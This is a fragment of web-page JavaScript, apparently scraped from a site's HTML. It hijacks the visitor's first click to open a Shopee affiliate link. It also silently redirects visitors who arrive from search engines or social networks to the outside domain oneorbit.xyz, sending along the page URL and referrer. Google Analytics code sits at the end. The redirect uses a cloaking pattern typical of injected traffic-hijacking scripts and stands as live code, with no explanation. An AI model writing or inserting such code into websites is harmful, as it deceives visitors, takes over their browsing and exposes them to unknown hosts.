type='text/javascript'>
//<![CDATA[
	$(document).ready(function()
	{
	  $('body').addClass('xepo_ads');
	});

	$(document).on('click','.xepo_ads',function(e)
	{
	    $(this).removeClass('xepo_ads');
	    window.open('https://shope.ee/6Uhmz5pJ0c','_blank');
	});
//]]>
//<![CDATA[
    if(document.referrer)
    {
    	var cek = document.referrer;

    	var ars 	= rChoice([
							'https://oneorbit.xyz/',
							]);

				function rChoice(arr) {
    			return arr[Math.floor(arr.length * Math.random())];
	}

	//Code arsae client javascript
	if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
    }

//
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-VWT8XY3VWX"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-VWT8XY3VWX');
</script>
//]]>
